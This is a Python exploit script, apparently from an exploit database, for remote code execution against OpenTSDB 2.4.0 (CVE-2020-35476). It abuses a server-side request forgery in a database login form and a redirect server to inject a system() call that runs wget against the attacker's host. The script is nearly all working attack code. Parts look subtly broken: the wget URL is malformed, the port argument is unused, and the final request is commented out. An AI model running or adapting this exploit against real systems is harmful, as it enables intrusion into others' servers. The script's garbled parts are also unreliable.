# Exploit Title: OpenTSDB 2.4.0 - Remote Code Execution
# Date: 30 January 2022
# Exploit Author: Cooper Beltrami
# Vendor Homepage: http://opentsdb.net
# Software Link: http://opentsdb.net
# Version: OpenTSDB version 2.4.0
# Tested on: macOS 12.2
# CVE: CVE-2020-35476

#!/usr/bin/env python3

import sys
import json
import requests
import threading

from bs4 import BeautifulSoup
from http.server import HTTPServer, BaseHTTPRequestHandler

print("==========================================================")
print("|     OPENTSDB REMOTE CODE EXECUTION (CVE-2020-35476)    |")
print("==========================================================")

def web_server(port, payload):
  print("[+] Starting SSRF redirect web server")

  class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
      self.send_response(302)
      self.send_header("Location", f"http://localhost:4242{payload}")
      self.end_headers()

    def log_message(self, format, *args):
      pass

  def start_server():
    HTTPServer(("", port), Redirect).serve_forever()

  threading.Thread(target=start_server).start()


def ssrf_request(port):
  global rhost, lhost, db, db_user, db_pass

  if port:
    port = f":{port}"

  body = {
    "auth[driver]": "elastic",
    "auth[server]": f"{lhost}{port}",
    "auth[username]": db_user,
    "auth[password]": db_pass,
    "auth[db]": db,
    "auth[permanent]": "1",
  }

  return requests.post(f"{rhost}/?elastic={db}&db={db}", data=body).text

def check_version():
  global rhost, lhost, db, db_user, db_pass

  print("[+] Checking OpenTSDB version")

  web_server(80, '/api/version')

  ssrf_response = ssrf_request("")

  soup = BeautifulSoup(ssrf_response, 'html.parser')
  error = soup.find("div", class_="error").text
  version = json.loads(error)['version']

  if version == '2.4.0':
    print("[+] Looks like this exploit should work!")
  else:
    print(f"[-] Running version {version}, should be 2.4.0")
    print("[-] Exiting now")
    sys.exit()

def exploit():
  global rhost, lhost, db, db_user, db_pass

  print("[+] Executing exploit")

  payload = f'/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=%5B33:system(%27wget%20http%3A%2F%2F{lhost}:8080%3A8080%27)%5D&wxh=1516x644&style=linespoint&baba=lala&grid=t&json'

  web_server(80, payload)

  # ssrf_response = ssrf_request(1234)

  # soup = BeautifulSoup(ssrf_response, 'html.parser')
  # error = soup.find("div", class_="error").text

  # print(error)

def main():
  global lhost, lport, rhost, db, db_user, db_pass

  if len(sys.argv) != 7:
    print("[-] Incorrect number of arguments")
    print("[*] Usage: python3 exploit.py <RHOST> <LHOST> <LPORT> <DB> <DB_USER> <DB_PASS>")
    sys.exit()

  # Could possible make it grab the credentials from the page without requiring user interaction
  rhost = sys.argv[1]
  lhost = sys.argv[2]
  lport = sys.argv[3]
  db = sys.argv[4]
  db_user = sys.argv[5]
  db_pass = sys.argv[6]

  if rhost.endswith("/"):
    rhost = rhost[:-1]

  # check_version()
  exploit()

if __name__ == "__main__":
  main()